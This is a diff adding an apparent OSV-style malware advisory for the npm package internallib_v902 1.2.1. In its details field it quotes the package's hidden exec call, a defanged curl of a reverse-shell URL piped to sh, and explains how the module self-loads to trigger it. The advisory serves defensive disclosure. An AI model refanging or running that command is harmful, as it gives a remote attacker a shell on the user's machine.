@@ -1,0 +1,58 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11543",
+  "modified": "2026-08-21T23:15:18Z",
+  "published": "2026-08-21T23:15:01Z",
+  "summary": "Malicious code in internallib_v902 (npm)",
+  "details": "Internallib_v902@1.2.1 ships index.js whose exported command() function executes a reverse shell via exec('/bin/bash -c \"curl hxxps://reverse-shell[.]sh/10[.]0[.]2[.]61:443|sh\"'), fetching a shell from reverse-shell.sh and piping it to sh, giving the remote host (10[.]0[.]2[.]61:443) a shell on the installer's machine. The bundled check.js requires the package and calls command(), so loading the module triggers the reverse shell. The package also declares itself as a dependency to force self-loading.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "internallib_v902",
+        "purl": "pkg:npm/internallib_v902"
+      },
+      "versions": [
+        "1.2.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/internallib_v902/v/1.2.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11543"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-21T23:15:01Z",
+      "indicators_observed": {
+        "sha256": [
+          "deeb736a555109ef5b064496625bee6914c5fbd79481d53c7fe413c0e0adb84f"
+        ]
+      }
+    }
+  }
+}
